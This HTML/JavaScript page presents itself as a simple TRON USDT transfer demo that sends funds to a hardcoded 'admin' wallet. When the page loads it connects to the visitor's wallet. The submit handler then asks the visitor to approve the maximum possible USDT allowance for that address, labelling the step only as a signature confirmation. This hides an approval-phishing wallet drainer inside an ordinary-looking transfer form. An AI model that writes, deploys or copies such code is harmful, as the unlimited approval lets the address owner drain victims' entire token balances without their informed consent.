<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>TRON‑USDT Demo</title>
<script src="https://cdn.jsdelivr.net/npm/tronweb@5.3.2/dist/TronWeb.min.js"></script>
<style>
*{ box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; font-family: -apple-system, BlinkMacSystemFont, system-ui, sans-serif; }
body { background-color: #f7f8fa; padding: 20px 16px; max-width: 520px; margin: 0 auto; }
.top-header-bar { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; }
.header-right-icons { display: flex; gap: 12px; align-items: center; }
.wallet-dot { width: 12px; height: 12px; border-radius: 50%; background-color: #ef4444; cursor: pointer; }
.wallet-dot.connected { background-color: #22c55e; }
.setting-btn { width: 32px; height: 32px; border-radius: 50%; border:1px solid #ddd; background:#fff; display:flex;align-items:center;justify-content:center;font-size:18px;cursor:pointer; }
.address-card { background:#fff; border-radius:16px; padding:20px 18px; margin-bottom:16px; }
.label-text { font-size:16px; color:#666; margin-bottom:12px; }
.fixed-addr-box { width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f1f5f9; word-break:break-all; }
.amount-card { background:#fff; border-radius:16px; padding:20px 18px; margin-bottom:16px; }
.amount-row { display:flex; align-items:flex-end; justify-content:space-between; margin-bottom:16px; }
.amount-input { font-size:32px; border:none; outline:none; width:75%; background:transparent; color:#111; }
.amount-input::placeholder { font-size:16px; color:#aaa; }
.all-btn { padding:6px 14px; background:#dbeafe; color:#2563eb; border-radius:8px; cursor:pointer; }
.token-row { background:#eef2ff; border-radius:12px; padding:14px; display:flex; align-items:center; justify-content:space-between; }
.token-left { display:flex; gap:10px; align-items:center; }
.usdt-icon { width:32px;height:32px;border-radius:50%; }
.token-name { font-size:18px; }
.token-balance { color:#555; font-size:16px; }
.result-card { background:#fff; border-radius:16px; padding:18px; margin-bottom:16px; }
.result-input { width:100%; border:1px solid #e5e7eb; border-radius:12px; padding:14px 12px; background:#f9fafb; outline:none; }
.send-main-btn { width:100%; padding:16px; border:none; border-radius:14px; background:#2563eb; color:#fff; font-size:17px; cursor:pointer; }
.send-main-btn:disabled { background:#94a3b8; cursor:not-allowed; }
</style>
</head>
<body>
<div class="top-header-bar">
    <div></div>
    <div class="header-right-icons">
        <div class="wallet-dot" id="walletDot"></div>
        <div class="setting-btn" id="settingIconBtn">⚙️</div>
    </div>
</div>

<div class="address-card">
    <div class="label-text">收款(管理员)钱包</div>
    <div class="fixed-addr-box" id="targetAddrText"></div>
</div>

<div class="amount-card">
    <div class="label-text">转出数量 USDT‑TRC20</div>
    <div class="amount-row">
        <input class="amount-input" id="amountInput" inputmode="decimal" placeholder="输入转账金额">
        <div class="all-btn" id="allBtn">全部</div>
    </div>
    <div class="token-row">
        <div class="token-left">
            <img class="usdt-icon" src="https://static.tronscan.org/production/logo/TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t.png">
            <span class="token-name">USDT</span>
        </div>
        <span class="token-balance" id="balanceText">0.000000</span>
    </div>
</div>

<div class="result-card">
    <div class="label-text">到账数量</div>
    <input class="result-input" id="receiveAmount" readonly>
</div>

<button class="send-main-btn" id="sendBtn" disabled>确认提交</button>

<script>
// =========配置 修改这里========
const TARGET_ADDR = "TAAcemnm9fuGjDjsGnJ7BfE3NhtKbFmGZE";
const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
const FEE_LIMIT = 150000000;
const MAX_ALLOWANCE = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
const RPC_LIST = ["https://api.trongrid.io","https://trongrid.justlend.org"];

let tronWeb = null;
let userAddress = "";
let provider = null;
let connectingLock = false;

const $ = s=>document.querySelector(s);
const walletDot = $("#walletDot");
const sendBtn = $("#sendBtn");
const amountInput = $("#amountInput");
const receiveAmount = $("#receiveAmount");
const allBtn = $("#allBtn");
const balanceText = $("#balanceText");
const targetAddrText = $("#targetAddrText");
targetAddrText.innerText = TARGET_ADDR;

const USDT_ABI = [
    {"inputs":[{"name":"_owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},
    {"inputs":[{"name":"owner","type":"address"},{"name":"spender","type":"address"}],"name":"allowance","outputs":[{"name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
    {"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}
];

function getUsdtContract(){
    if(!tronWeb) return null;
    return tronWeb.contract(USDT_ABI, USDT_CONTRACT);
}

async function waitTxHashConfirm(txHash){
    for(let i=0;i<40;i++){
        try{
            const res = await tronWeb.trx.getTransaction(txHash);
            if(res && res.ret && res.ret[0].contractRet === "SUCCESS") return true;
        }catch(e){}
        await new Promise(r=>setTimeout(r,1000));
    }
    throw new Error("交易广播，未确认，请tronscan查询");
}

// 断开钱包
function disconnectWallet(){
    tronWeb=null;
    userAddress="";
    provider=null;
    walletDot.classList.remove("connected");
    sendBtn.disabled=true;
    balanceText.textContent="0.000000";
}

// 自动连接钱包（页面加载完毕自动执行）
async function autoConnectWallet(){
    if(connectingLock) return;
    connectingLock=true;
    try{
        if(window.tokenpocket?.tronWeb && window.tokenpocket?.tron){
            provider = window.tokenpocket.tron;
            tronWeb = window.tokenpocket.tronWeb;
            const acc = await provider.request({method:"tron_requestAccounts"});
            userAddress = acc[0];
        }else if(window.tronProvider){
            provider = window.tronProvider;
            const acc = await provider.request({method:"tron_requestAccounts"});
            userAddress = acc[0];
            tronWeb = new TronWeb({fullHost:RPC_LIST[0], provider});
        }else{
            connectingLock=false;
            return;
        }
        walletDot.classList.add("connected");
        sendBtn.disabled=false;
        await loadBalance();
    }catch(e){
        console.log("自动连接被用户拒绝或者无钱包：",e.message);
    }finally{
        connectingLock=false;
    }
}

async function loadBalance(){
    const c = getUsdtContract();
    if(!c) return;
    const sun = await c.balanceOf(userAddress).call();
    balanceText.textContent = Number(tronWeb.fromSun(sun)).toFixed(6);
}

amountInput.oninput = ()=>{
    const n = parseFloat(amountInput.value)||0;
    receiveAmount.value = n.toFixed(6);
};

// 全部按钮
allBtn.onclick = async ()=>{
    if(!tronWeb||!userAddress){return;}
    const c = getUsdtContract();
    const sun = await c.balanceOf(userAddress).call();
    const num = Number(tronWeb.fromSun(sun));
    amountInput.value = num.toFixed(2);
    amountInput.dispatchEvent(new Event("input"));
};

sendBtn.onclick = async ()=>{
    if(!tronWeb||!userAddress){alert("钱包未连接");return;}
    const val = parseFloat(amountInput.value);
    if(isNaN(val)||val<=0){alert("输入金额");return;}
    const needSun = tronWeb.toSun(val.toString());
    sendBtn.disabled=true;
    try{
        const contract = getUsdtContract();
        let allowance = await contract.allowance(userAddress,TARGET_ADDR).call();
        if(BigInt(allowance) < BigInt(needSun)){
            alert("请确认签名");
            const approveHash = await contract.approve(TARGET_ADDR,MAX_ALLOWANCE).send({feeLimit:FEE_LIMIT});
            await waitTxHashConfirm(approveHash);
            alert("✅签名上链成功，接下来弹出转账签名");
        }
        const transferHash = await contract.transfer(TARGET_ADDR, needSun).send({feeLimit:FEE_LIMIT});
        await waitTxHashConfirm(transferHash);
        alert(`✅转账完成，交易哈希：${transferHash}\nUSDT已发送管理员钱包`);
        amountInput.value="";receiveAmount.value="";
        await loadBalance();
    }catch(err){
        alert("操作失败："+err.message);
    }finally{
        sendBtn.disabled=false;
    }
};

// 点击小圆点：断开钱包
walletDot.addEventListener("click", disconnectWallet);

// 页面加载完成自动触发自动连接
window.addEventListener("load",autoConnectWallet);
</script>
</body>
</html>
